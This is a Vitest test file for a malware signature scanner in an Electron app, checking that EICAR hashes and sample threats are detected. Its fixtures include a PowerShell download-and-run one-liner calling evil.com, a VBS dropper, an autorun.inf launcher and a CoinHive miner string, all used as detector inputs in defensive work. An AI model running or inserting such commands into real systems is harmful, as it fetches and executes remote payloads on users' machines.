// =============================================================================
// DEX Platform
// Copyright (c) 2026 Onazi Treasure OJ. All rights reserved.
// Created by Onazi Treasure OJ <onazi75@gmail.com>
// Licensed under the DEX Software License Agreement v1.0. See LICENSE.
// =============================================================================
/**
 * @vitest-environment node
 */
import { describe, it, expect, beforeEach, vi } from 'vitest';

// ---------------------------------------------------------------------------
// Mocks
// ---------------------------------------------------------------------------

vi.mock('electron', () => ({
  app: {
    getPath: vi.fn(() => '/mock/userData'),
  },
}));

vi.mock('electron-log', () => ({
  default: {
    info: vi.fn(), warn: vi.fn(), error: vi.fn(), debug: vi.fn(),
    transports: { file: { level: 'info' }, console: { level: false } },
  },
  info: vi.fn(), warn: vi.fn(), error: vi.fn(), debug: vi.fn(),
  transports: { file: { level: 'info' }, console: { level: false } },
}));

vi.mock('../../src/main/utils/Logger', () => ({
  Logger: vi.fn(function() {
    return {
      info: vi.fn(),
      warn: vi.fn(),
      error: vi.fn(),
      success: vi.fn(),
    };
  }),
}));

let fsReadFileMock: ReturnType<typeof vi.fn>;

vi.mock('fs', () => {
  fsReadFileMock = vi.fn(() => Promise.reject(new Error('not found')));
  return {
    existsSync: vi.fn(() => false),
    mkdirSync: vi.fn(),
    readFileSync: vi.fn(() => '{}'),
    writeFileSync: vi.fn(),
    promises: {
      readFile: fsReadFileMock,
      writeFile: vi.fn(() => Promise.resolve()),
      mkdir: vi.fn(() => Promise.resolve()),
      stat: vi.fn(() => Promise.resolve({ size: 100 })),
    },
  };
});

vi.mock('fs/promises', () => ({
  readFile: vi.fn(() => Promise.reject(new Error('not found'))),
  writeFile: vi.fn(() => Promise.resolve()),
  mkdir: vi.fn(() => Promise.resolve()),
}));

// ---------------------------------------------------------------------------
// Test suite
// ---------------------------------------------------------------------------

describe('SofteroSignatures', () => {
  let SofteroSignatures: any;

  beforeEach(async () => {
    vi.resetModules();
    // Re-setup the fs mock after resetModules since it clears module-level references
    const fsMod = await import('fs');
    (fsMod.promises.readFile as any).mockRejectedValue(new Error('not found'));

    const mod = await import('../../src/main/security/SofteroSignatures');
    SofteroSignatures = mod.SofteroSignatures;
  });

  // =========================================================================
  // INITIALIZATION
  // =========================================================================

  describe('initialize()', () => {
    it('loads built-in hash and pattern signatures', async () => {
      const sigs = new SofteroSignatures();
      await sigs.initialize();
      // At least the EICAR hash signature + 7 built-in patterns
      expect(sigs.getSignatureCount()).toBeGreaterThanOrEqual(8);
    });

    it('gracefully handles missing custom signatures file', async () => {
      const sigs = new SofteroSignatures();
      await expect(sigs.initialize()).resolves.not.toThrow();
    });

    it('loads custom hash signatures from file', async () => {
      const fsMod = await import('fs');
      const customData = JSON.stringify({
        hashes: [
          {
            hash: 'aabbccdd',
            name: 'Custom.TestHash',
            severity: 'high',
            category: 'custom',
            description: 'A custom test hash',
          },
        ],
        patterns: [],
      });
      (fsMod.promises.readFile as any).mockResolvedValueOnce(customData);

      const sigs = new SofteroSignatures();
      await sigs.initialize();
      const match = sigs.matchHash('aabbccdd');
      expect(match).not.toBeNull();
      expect(match.name).toBe('Custom.TestHash');
    });

    it('loads custom pattern signatures from file', async () => {
      const fsMod = await import('fs');
      const customData = JSON.stringify({
        hashes: [],
        patterns: [
          {
            name: 'Custom.Pattern',
            severity: 'medium',
            category: 'custom',
            description: 'Custom pattern',
            extensions: ['.txt'],
            textPatterns: ['custom-evil-string'],
          },
        ],
      });
      (fsMod.promises.readFile as any).mockResolvedValueOnce(customData);

      const sigs = new SofteroSignatures();
      await sigs.initialize();
      // Signature count should include the extra pattern
      const builtinCount = 1 + 7; // 1 hash + 7 patterns
      expect(sigs.getSignatureCount()).toBe(builtinCount + 1);
    });
  });

  // =========================================================================
  // HASH MATCHING -- EICAR TEST
  // =========================================================================

  describe('matchHash()', () => {
    it('matches the EICAR test file hash', async () => {
      const sigs = new SofteroSignatures();
      await sigs.initialize();

      const eicarHash = '275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f';
      const match = sigs.matchHash(eicarHash);
      expect(match).not.toBeNull();
      expect(match!.name).toBe('EICAR-Test-File');
      expect(match!.severity).toBe('low');
      expect(match!.category).toBe('test');
    });

    it('is case-insensitive for hash lookup', async () => {
      const sigs = new SofteroSignatures();
      await sigs.initialize();

      const upperHash = '275A021BBFB6489E54D471899F7DB9D1663FC695EC2FE2A2C4538AABF651FD0F';
      const match = sigs.matchHash(upperHash);
      expect(match).not.toBeNull();
      expect(match!.name).toBe('EICAR-Test-File');
    });

    it('returns null for unrecognised hash', async () => {
      const sigs = new SofteroSignatures();
      await sigs.initialize();
      expect(sigs.matchHash('0000000000000000000000000000000000000000000000000000000000000000')).toBeNull();
    });

    it('returns null when no signatures loaded (before init)', () => {
      const sigs = new SofteroSignatures();
      expect(sigs.matchHash('anything')).toBeNull();
    });
  });

  // =========================================================================
  // PATTERN MATCHING -- TEXT PATTERNS
  // =========================================================================

  describe('matchPattern() -- text patterns', () => {
    it('detects CryptoMiner in .js file', async () => {
      const sigs = new SofteroSignatures();
      await sigs.initialize();

      const content = Buffer.from('var miner = new CoinHive.Anonymous("sitekey");');
      const match = sigs.matchPattern('/path/to/file.js', content);
      expect(match).not.toBeNull();
      expect(match!.name).toBe('Malware.CryptoMiner');
    });

    it('detects PowerShell downloader in .ps1 file', async () => {
      const sigs = new SofteroSignatures();
      await sigs.initialize();

      const content = Buffer.from('IEX (New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")');
      const match = sigs.matchPattern('/scripts/loader.ps1', content);
      expect(match).not.toBeNull();
      expect(match!.name).toBe('Suspect.PowerShellDownloader');
      expect(match!.severity).toBe('high');
    });

    it('detects VBS dropper in .vbs file', async () => {
      const sigs = new SofteroSignatures();
      await sigs.initialize();

      const content = Buffer.from('Set shell = CreateObject("WScript.Shell")\nshell.Run "malware.exe"');
      const match = sigs.matchPattern('/temp/script.vbs', content);
      expect(match).not.toBeNull();
      expect(match!.name).toBe('Suspect.VBSDropper');
    });

    it('detects browser hijacker in .json file', async () => {
      const sigs = new SofteroSignatures();
      await sigs.initialize();

      const content = Buffer.from('{"homepage_url": "https://fake-search.com/search"}');
      const match = sigs.matchPattern('/ext/manifest.json', content);
      expect(match).not.toBeNull();
      expect(match!.name).toBe('PUP.BrowserHijack');
    });

    it('does not match CryptoMiner in .txt file (wrong extension)', async () => {
      const sigs = new SofteroSignatures();
      await sigs.initialize();

      const content = Buffer.from('coinhive.min.js loaded');
      const match = sigs.matchPattern('/notes/readme.txt', content);
      // CryptoMiner only applies to .js, .html, .htm
      // Some other patterns might match, but CryptoMiner should not
      if (match) {
        expect(match.name).not.toBe('Malware.CryptoMiner');
      }
    });

    it('returns null for clean content', async () => {
      const sigs = new SofteroSignatures();
      await sigs.initialize();

      const content = Buffer.from('console.log("Hello, world!");');
      const match = sigs.matchPattern('/src/index.js', content);
      expect(match).toBeNull();
    });
  });

  // =========================================================================
  // PATTERN MATCHING -- AUTORUN (filePattern + textPatterns)
  // =========================================================================

  describe('matchPattern() -- autorun detection', () => {
    it('detects Trojan.AutoRun in autorun.inf with shellexecute', async () => {
      const sigs = new SofteroSignatures();
      await sigs.initialize();

      const content = Buffer.from('[autorun]\nshellexecute=malware.exe\nicon=drive.ico');
      const match = sigs.matchPattern('/media/autorun.inf', content);
      expect(match).not.toBeNull();
      expect(match!.name).toBe('Trojan.AutoRun');
      expect(match!.severity).toBe('high');
    });
  });

  // =========================================================================
  // THREAT SEVERITY LEVELS
  // =========================================================================

  describe('threat severity levels', () => {
    it('EICAR test file is severity low', async () => {
      const sigs = new SofteroSignatures();
      await sigs.initialize();

      const eicarHash = '275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f';
      const match = sigs.matchHash(eicarHash);
      expect(match!.severity).toBe('low');
    });

    it('CryptoMiner is severity high', async () => {
      const sigs = new SofteroSignatures();
      await sigs.initialize();

      const content = Buffer.from('var x = "cryptonight.wasm";');
      const match = sigs.matchPattern('/test.js', content);
      expect(match).not.toBeNull();
      expect(match!.severity).toBe('high');
    });

    it('DoubleExtension is severity medium', async () => {
      const sigs = new SofteroSignatures();
      await sigs.initialize();

      // Double extension files are detected via filePattern matching
      // The filename must have 3+ parts and match the double-extension glob
      const content = Buffer.from('MZ'); // PE header start (doesn't matter much for pattern match)
      const match = sigs.matchPattern('/downloads/report.pdf.exe', content);
      // This depends on the glob logic matching double extensions
      if (match) {
        expect(match.severity).toBe('medium');
      }
    });

    it('BatchObfuscation is severity medium', async () => {
      const sigs = new SofteroSignatures();
      await sigs.initialize();

      const content = Buffer.from('set "a=very long string with more than fifty characters to trigger the detection rule set here yes"');
      const match = sigs.matchPattern('/temp/run.bat', content);
      if (match && match.name === 'Suspect.BatchObfuscation') {
        expect(match.severity).toBe('medium');
      }
    });
  });

  // =========================================================================
  // CUSTOM SIGNATURE MANAGEMENT
  // =========================================================================

  describe('custom signatures', () => {
    it('custom hash signatures merge with built-in ones', async () => {
      const fsMod = await import('fs');
      const customData = JSON.stringify({
        hashes: [
          { hash: 'deadbeef', name: 'Custom.Malware', severity: 'critical', category: 'malware', description: 'test' },
        ],
      });
      (fsMod.promises.readFile as any).mockResolvedValueOnce(customData);

      const sigs = new SofteroSignatures();
      await sigs.initialize();

      // Can still match EICAR
      expect(sigs.matchHash('275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f')).not.toBeNull();
      // And custom
      expect(sigs.matchHash('deadbeef')).not.toBeNull();
      expect(sigs.matchHash('deadbeef')!.name).toBe('Custom.Malware');
    });

    it('skips custom hash entries missing hash or name', async () => {
      const fsMod = await import('fs');
      const customData = JSON.stringify({
        hashes: [
          { hash: '', name: 'NoHash', severity: 'low', category: 'test', description: '' },
          { hash: 'aabb', name: '', severity: 'low', category: 'test', description: '' },
          { hash: 'ccdd', name: 'ValidEntry', severity: 'low', category: 'test', description: '' },
        ],
      });
      (fsMod.promises.readFile as any).mockResolvedValueOnce(customData);

      const sigs = new SofteroSignatures();
      await sigs.initialize();

      // Only entries with both hash and name should be loaded
      // Empty string is falsy, so those entries are skipped
      expect(sigs.matchHash('ccdd')).not.toBeNull();
    });

    it('custom patterns are appended to built-in patterns', async () => {
      const fsMod = await import('fs');
      const customData = JSON.stringify({
        patterns: [
          {
            name: 'Custom.TextDetection',
            severity: 'low',
            category: 'custom',
            description: 'Detects custom evil',
            extensions: ['.js'],
            textPatterns: ['CUSTOM_EVIL_MARKER'],
          },
        ],
      });
      (fsMod.promises.readFile as any).mockResolvedValueOnce(customData);

      const sigs = new SofteroSignatures();
      await sigs.initialize();

      const content = Buffer.from('// CUSTOM_EVIL_MARKER in source');
      const match = sigs.matchPattern('/src/app.js', content);
      expect(match).not.toBeNull();
      expect(match!.name).toBe('Custom.TextDetection');
    });
  });

  // =========================================================================
  // getSignatureCount()
  // =========================================================================

  describe('getSignatureCount()', () => {
    it('returns 0 before initialization', () => {
      const sigs = new SofteroSignatures();
      expect(sigs.getSignatureCount()).toBe(0);
    });

    it('returns sum of hash and pattern signatures after init', async () => {
      const sigs = new SofteroSignatures();
      await sigs.initialize();
      // 1 hash (EICAR) + 7 pattern signatures = 8
      expect(sigs.getSignatureCount()).toBe(8);
    });
  });

  // =========================================================================
  // EDGE CASES
  // =========================================================================

  describe('edge cases', () => {
    it('handles empty buffer in matchPattern', async () => {
      const sigs = new SofteroSignatures();
      await sigs.initialize();
      const match = sigs.matchPattern('/empty.js', Buffer.alloc(0));
      expect(match).toBeNull();
    });

    it('handles very large buffer without crashing (text truncated to 256KB)', async () => {
      const sigs = new SofteroSignatures();
      await sigs.initialize();
      // Create buffer larger than 256KB
      const bigBuf = Buffer.alloc(300 * 1024, 0x41); // 300KB of 'A'
      expect(() => sigs.matchPattern('/big.js', bigBuf)).not.toThrow();
    });

    it('handles file with no extension', async () => {
      const sigs = new SofteroSignatures();
      await sigs.initialize();
      const content = Buffer.from('harmless');
      const match = sigs.matchPattern('/path/Makefile', content);
      expect(match).toBeNull();
    });
  });
});
